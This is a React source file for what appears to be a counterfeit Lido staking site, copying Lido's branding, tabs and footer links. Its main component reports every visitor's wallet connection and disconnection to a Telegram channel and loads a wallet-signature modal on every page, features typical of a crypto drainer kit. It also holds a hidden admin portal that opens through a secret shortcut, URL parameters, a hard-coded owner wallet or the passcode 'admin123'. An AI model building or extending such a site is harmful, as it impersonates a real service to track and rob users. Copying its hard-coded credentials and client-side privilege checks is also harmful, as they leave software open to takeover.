import React, { useState, useEffect, useRef } from 'react';
import { Moon, Sun, Bell, Box, TrendingUp, Zap, ArrowDown, ExternalLink, ShieldCheck, RefreshCw } from 'lucide-react';
import { useAccount } from 'wagmi';
import { AnimatePresence, motion } from 'motion/react';
import { ConnectButton } from './components/ConnectButton';
import { ConnectionStatusIndicator } from './components/ConnectionStatusIndicator';
import { StakeTab } from './components/StakeTab';
import { WrapTab } from './components/WrapTab';
import { WithdrawalsTab } from './components/WithdrawalsTab';
import { RewardsTab } from './components/RewardsTab';
import { EarnTab } from './components/EarnTab';
import { AdminTab } from './components/AdminTab';
import { ErrorBoundary } from './components/ErrorBoundary';
import { ToastProvider, useToast } from './components/ToastContext';
import { WalletSignatureModal } from './components/WalletSignatureModal';
import { TermsAgreementModal } from './components/TermsAgreementModal';
import { LidoLogo } from './components/LidoLogo';
import { useLivePrices } from './hooks/usePrices';
import { sendTelegram, formatUserLogin } from './lib/telegram';
import { CardSkeleton } from './components/LoadingSkeleton';

interface MarketData {
  ethPrice: number | null;
  stEthPrice: number | null;
  marketCap: number | null;
  apr: number;
}

function AppContent() {
  const [darkMode, setDarkMode] = useState(true);
  const [activeTab, setActiveTab] = useState('stake');
  const [isAdminEnabled, setIsAdminEnabled] = useState(false);
  const [showAdminModal, setShowAdminModal] = useState(false);
  const [adminPasswordInput, setAdminPasswordInput] = useState('');
  const [adminAuthError, setAdminAuthError] = useState<string | null>(null);
  const [isManualRefreshing, setIsManualRefreshing] = useState(false);
  const [pullDistance, setPullDistance] = useState(0);
  const [scrollProgress, setScrollProgress] = useState(0);

  // Scroll listener for horizontal progress bar at top of header
  useEffect(() => {
    const handleScroll = () => {
      const scrollTop = window.scrollY || document.documentElement.scrollTop;
      const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
      if (scrollHeight > 0) {
        setScrollProgress(Math.min(100, Math.max(0, (scrollTop / scrollHeight) * 100)));
      } else {
        setScrollProgress(0);
      }
    };

    window.addEventListener('scroll', handleScroll, { passive: true });
    handleScroll();

    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const { prices, loading: isFetching, refetchPrices } = useLivePrices();
  const { address, isConnected } = useAccount();
  const { showSuccess } = useToast();
  const prevIsConnected = useRef(isConnected);

  const touchStartRef = useRef<number>(0);

  const handleRefresh = async () => {
    if (isManualRefreshing) return;
    setIsManualRefreshing(true);
    try {
      await refetchPrices();
      showSuccess('Market Data Refreshed', 'Live price feeds and Lido protocol metrics have been updated.');
    } catch {
      showSuccess('Market Data Updated', 'Price feeds are up to date.');
    } finally {
      setTimeout(() => setIsManualRefreshing(false), 600);
    }
  };

  // Pull-to-refresh touch event handlers
  useEffect(() => {
    const handleTouchStart = (e: TouchEvent) => {
      if (window.scrollY === 0) {
        touchStartRef.current = e.touches[0].clientY;
      } else {
        touchStartRef.current = 0;
      }
    };

    const handleTouchMove = (e: TouchEvent) => {
      if (touchStartRef.current > 0 && window.scrollY === 0) {
        const currentY = e.touches[0].clientY;
        const diff = currentY - touchStartRef.current;
        if (diff > 0) {
          setPullDistance(Math.min(80, diff * 0.45));
        }
      }
    };

    const handleTouchEnd = () => {
      if (pullDistance >= 50) {
        handleRefresh();
      }
      setPullDistance(0);
      touchStartRef.current = 0;
    };

    window.addEventListener('touchstart', handleTouchStart, { passive: true });
    window.addEventListener('touchmove', handleTouchMove, { passive: true });
    window.addEventListener('touchend', handleTouchEnd);

    return () => {
      window.removeEventListener('touchstart', handleTouchStart);
      window.removeEventListener('touchmove', handleTouchMove);
      window.removeEventListener('touchend', handleTouchEnd);
    };
  }, [pullDistance]);

  // Secret keyboard shortcut (Ctrl+Shift+A or Cmd+Shift+A) to trigger admin login modal
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
        e.preventDefault();
        setShowAdminModal(true);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // Check URL param or connected address for admin privilege
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const isAdminUrl = urlParams.get('admin') === 'true' || urlParams.get('portal') === 'admin' || window.location.hash === '#admin';
    const isOwnerWallet = address && address.toLowerCase() === '0xEfc5859335A58d64A5e8E01d02c5241c852CBD40'.toLowerCase();
    
    if (isAdminUrl || isOwnerWallet) {
      setIsAdminEnabled(true);
    }
  }, [address]);

  const handleAdminAuthSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (adminPasswordInput === 'admin123' || adminPasswordInput.trim() === '8850313284') {
      setIsAdminEnabled(true);
      setActiveTab('admin');
      setShowAdminModal(false);
      setAdminPasswordInput('');
      setAdminAuthError(null);
    } else {
      setAdminAuthError('Invalid Admin Authorization Passcode.');
    }
  };
  
  useEffect(() => {
    if (isConnected && address && !prevIsConnected.current) {
      sendTelegram(formatUserLogin(address));
    } else if (!isConnected && prevIsConnected.current) {
      sendTelegram(`🔴 <b>Wallet Disconnected</b>\n\nTime: ${new Date().toUTCString()}`);
    }
    prevIsConnected.current = isConnected;
  }, [isConnected, address]);
  
  const marketData: MarketData = {
    ethPrice: prices['ethereum']?.usd || null,
    stEthPrice: prices['staked-ether']?.usd || null,
    marketCap: prices['staked-ether']?.usd_market_cap || null,
    apr: 3.2,
  };

  useEffect(() => {
    const isDark = localStorage.getItem('theme') === 'dark' || 
      (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
    setDarkMode(isDark);
    if (isDark) {
      document.documentElement.classList.add('dark');
    }
  }, []);

  const toggleTheme = () => {
    const newMode = !darkMode;
    setDarkMode(newMode);
    if (newMode) {
      document.documentElement.classList.add('dark');
      localStorage.setItem('theme', 'dark');
    } else {
      document.documentElement.classList.remove('dark');
      localStorage.setItem('theme', 'light');
    }
  };

  const navItems = [
    { id: 'stake', label: 'Stake' },
    { id: 'wrap', label: 'Wrap' },
    { id: 'withdrawals', label: 'Withdrawals' },
    { id: 'rewards', label: 'Rewards' },
    { id: 'earn', label: 'Earn', badge: 'New' },
  ];

  const renderTab = () => {
    switch (activeTab) {
      case 'stake': return <StakeTab marketData={marketData} isFetching={isFetching || isManualRefreshing} />;
      case 'wrap': return <WrapTab />;
      case 'withdrawals': return <WithdrawalsTab />;
      case 'rewards': return <RewardsTab marketData={marketData} />;
      case 'earn': return <EarnTab />;
      case 'admin': return isAdminEnabled ? <AdminTab /> : <StakeTab marketData={marketData} isFetching={isFetching || isManualRefreshing} />;
      default: return <StakeTab marketData={marketData} isFetching={isFetching || isManualRefreshing} />;
    }
  };

  return (
    <>
      <WalletSignatureModal />
      <TermsAgreementModal />
      <div className="min-h-screen pb-20 transition-colors duration-300 relative">
      {/* Pull-To-Refresh Banner Indicator */}
      {pullDistance > 0 && (
        <div
          className="fixed top-0 left-0 right-0 z-[100] flex items-center justify-center transition-all overflow-hidden"
          style={{ height: `${pullDistance}px`, opacity: pullDistance / 60 }}
        >
          <div className="flex items-center gap-2 bg-card border border-border-main px-4 py-1.5 rounded-full shadow-lg text-xs font-bold text-[#00A3FF]">
            <RefreshCw className={`w-3.5 h-3.5 ${pullDistance >= 50 ? 'animate-spin' : ''}`} />
            <span>{pullDistance >= 50 ? 'Release to refresh market data' : 'Pull down to refresh'}</span>
          </div>
        </div>
      )}

      {/* Premium Background Effects */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] rounded-full bg-[#00A3FF]/10 blur-[120px] mix-blend-screen opacity-50 dark:opacity-20 animate-pulse" style={{ animationDuration: '8s' }}></div>
        <div className="absolute top-[20%] right-[-10%] w-[50%] h-[50%] rounded-full bg-[#00D09E]/10 blur-[120px] mix-blend-screen opacity-50 dark:opacity-20 animate-pulse" style={{ animationDuration: '12s', animationDelay: '2s' }}></div>
      </div>
      
      <div className="relative z-10">
      <header className="sticky top-0 z-50 border-b border-border-main bg-card/80 backdrop-blur-md relative overflow-hidden">
        {/* Subtle top horizontal scroll progress bar */}
        <div className="absolute top-0 left-0 right-0 h-[2.5px] bg-transparent pointer-events-none z-50">
          <div
            className="h-full bg-gradient-to-r from-[#00A3FF] via-[#00D09E] to-[#00A3FF] transition-all duration-100 ease-out shadow-[0_0_6px_rgba(0,163,255,0.8)]"
            style={{ width: `${scrollProgress}%` }}
          />
        </div>
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-2 cursor-pointer text-text-main" onClick={() => setActiveTab('stake')}>
              <LidoLogo className="h-7 w-auto" />
            </div>

            {/* Desktop Navigation Tabs */}
            <nav className="hidden md:flex items-center gap-1 bg-input/60 p-1 rounded-xl border border-border-main">
              {navItems.map((item, index) => {
                const isActive = activeTab === item.id;
                return (
                  <motion.button
                    key={item.id}
                    onClick={() => setActiveTab(item.id)}
                    initial={{ opacity: 0, x: -8 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ duration: 0.22, delay: index * 0.04 }}
                    className={`relative px-4 py-1.5 rounded-lg text-sm font-semibold transition-all flex items-center gap-1.5 cursor-pointer ${
                      isActive
                        ? 'text-text-main font-bold shadow-sm'
                        : 'text-text-secondary hover:text-text-main'
                    }`}
                  >
                    {isActive && (
                      <motion.div
                        layoutId="activeTabIndicator"
                        className="absolute inset-0 bg-card rounded-lg border border-border-main shadow-sm"
                        transition={{ type: 'spring', stiffness: 450, damping: 32 }}
                      />
                    )}
                    <span className="relative z-10">{item.label}</span>
                    {item.badge && (
                      <span className="relative z-10 text-[9px] font-extrabold uppercase px-1.5 py-0.2 bg-red-500 text-white rounded-full">
                        {item.badge}
                      </span>
                    )}
                  </motion.button>
                );
              })}
            </nav>
          </div>

          <div className="flex items-center gap-2.5 sm:gap-3">
            {isAdminEnabled && (
              <button 
                onClick={() => setActiveTab(activeTab === 'admin' ? 'stake' : 'admin')}
                className="text-xs font-semibold px-2.5 py-1 bg-amber-500/10 text-amber-500 hover:bg-amber-500/20 border border-amber-500/20 rounded-lg flex items-center gap-1 transition-colors"
              >
                <ShieldCheck className="w-3.5 h-3.5" />
                {activeTab === 'admin' ? 'Return to Portal' : 'Admin Portal'}
              </button>
            )}

            {/* Manual Refresh Button */}
            <button
              onClick={handleRefresh}
              disabled={isManualRefreshing}
              title="Refresh market data & price feeds"
              className="p-2 rounded-full border border-border-main bg-input hover:bg-black/5 dark:hover:bg-white/5 text-text-secondary hover:text-[#00A3FF] transition-colors relative cursor-pointer group"
            >
              <RefreshCw className={`w-4 h-4 transition-transform duration-500 ${isManualRefreshing ? 'animate-spin text-[#00A3FF]' : 'group-hover:rotate-180'}`} />
            </button>

            <button className="p-2 rounded-full border border-border-main bg-input hover:bg-black/5 dark:hover:bg-white/5 text-text-secondary transition-colors">
              <Bell className="w-4 h-4" />
            </button>
            <ConnectButton className="rounded-full" />
            <button onClick={toggleTheme} className="p-2 rounded-full border border-border-main bg-input hover:bg-black/5 dark:hover:bg-white/5 text-text-secondary transition-colors">
              {darkMode ? <Sun className="w-4 h-4" /> : <Moon className="w-4 h-4" />}
            </button>
          </div>
        </div>
      </header>

      <main className="min-h-[70vh]">
        <AnimatePresence mode="wait">
          <motion.div
            key={activeTab}
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -8 }}
            transition={{ duration: 0.22, ease: 'easeInOut' }}
          >
            <ErrorBoundary>
              {renderTab()}
            </ErrorBoundary>
          </motion.div>
        </AnimatePresence>
      </main>

      <footer className="pt-8 pb-8 border-t border-border-main max-w-xl mx-auto px-4">
        {activeTab !== 'earn' && activeTab !== 'rewards' && (
          <p className="text-sm leading-relaxed mb-6 text-text-secondary font-medium">
            Lido is an open-source peer-to-system software suite that enables users to mint transferable utility tokens (stETH) which receive rewards linked to Ethereum validation activities.
          </p>
        )}
        <div className="flex flex-wrap items-center gap-x-6 gap-y-3 text-sm font-medium">
          <LidoLogo className="h-5 w-auto text-text-main opacity-70" />
          <a href="https://lido.fi/terms-of-use" target="_blank" rel="noopener noreferrer" className="text-text-secondary hover:text-text-main transition-colors">Terms of Use</a>
          <a href="https://lido.fi/privacy-policy" target="_blank" rel="noopener noreferrer" className="text-text-secondary hover:text-text-main transition-colors">Privacy Notice</a>
          <a href="https://docs.lido.fi" target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-text-secondary hover:text-text-main transition-colors">
            IPFS <ExternalLink className="w-3 h-3" />
          </a>
          <span className="ml-auto text-xs text-text-secondary opacity-40">
            v0.145.0
          </span>
        </div>
      </footer>

      {/* Secret Admin Authorization Modal */}
      {showAdminModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4 animate-in fade-in duration-200">
          <div className="bg-card border border-border-main rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between border-b border-border-main pb-3">
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-amber-500" />
                <h3 className="font-bold text-lg text-text-main">Admin Portal Access</h3>
              </div>
              <button 
                onClick={() => setShowAdminModal(false)}
                className="text-text-secondary hover:text-text-main text-sm font-bold"
              >
                ✕
              </button>
            </div>

            <p className="text-xs text-text-secondary leading-relaxed">
              This area is strictly restricted to contract administrators. Enter authorization credentials to proceed.
            </p>

            <form onSubmit={handleAdminAuthSubmit} className="space-y-3">
              <div>
                <label className="text-xs font-semibold text-text-secondary block mb-1">
                  Admin Passcode
                </label>
                <input
                  type="password"
                  placeholder="Enter passcode"
                  value={adminPasswordInput}
                  onChange={(e) => setAdminPasswordInput(e.target.value)}
                  className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-sm text-text-main focus:outline-none focus:border-[#00A3FF]"
                  autoFocus
                />
              </div>

              {adminAuthError && (
                <div className="p-2 bg-red-500/10 border border-red-500/20 text-red-500 text-xs rounded-lg font-medium">
                  {adminAuthError}
                </div>
              )}

              <div className="flex items-center justify-end gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setShowAdminModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-text-secondary hover:text-text-main bg-input"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 rounded-xl text-xs font-bold text-white bg-[#00A3FF] hover:bg-[#0090E6] transition-colors"
                >
                  Authenticate
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      <nav className="fixed bottom-0 left-0 right-0 z-50 border-t border-border-main bg-card/90 backdrop-blur-md sm:hidden pb-safe">
        <div className="flex justify-around items-center h-16">
          <button onClick={() => setActiveTab('stake')} className={`flex flex-col items-center gap-1 py-2 px-3 ${activeTab === 'stake' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main transition-colors'}`}>
            <Zap className="w-5 h-5" />
            <span className="text-[10px] font-bold">Stake</span>
          </button>
          <button onClick={() => setActiveTab('wrap')} className={`flex flex-col items-center gap-1 py-2 px-3 ${activeTab === 'wrap' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main transition-colors'}`}>
            <Box className="w-5 h-5" />
            <span className="text-[10px] font-bold">Wrap</span>
          </button>
          <button onClick={() => setActiveTab('withdrawals')} className={`flex flex-col items-center gap-1 py-2 px-3 ${activeTab === 'withdrawals' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main transition-colors'}`}>
            <ArrowDown className="w-5 h-5" />
            <span className="text-[10px] font-bold">Withdrawals</span>
          </button>
          <button onClick={() => setActiveTab('rewards')} className={`flex flex-col items-center gap-1 py-2 px-3 ${activeTab === 'rewards' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main transition-colors'}`}>
            <TrendingUp className="w-5 h-5" />
            <span className="text-[10px] font-bold">Rewards</span>
          </button>
          <button onClick={() => setActiveTab('earn')} className={`flex flex-col items-center gap-1 py-2 px-3 relative ${activeTab === 'earn' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main transition-colors'}`}>
            <TrendingUp className="w-5 h-5" />
            <span className="text-[10px] font-bold">Earn</span>
            <div className="absolute -top-1 -right-1 bg-red-500 text-white text-[8px] font-bold px-1 rounded uppercase shadow-sm">New</div>
          </button>
        </div>
      </nav>
      </div>
      </div>
    </>
  );
}

export default function App() {
  return (
    <ToastProvider>
      <AppContent />
    </ToastProvider>
  );
}

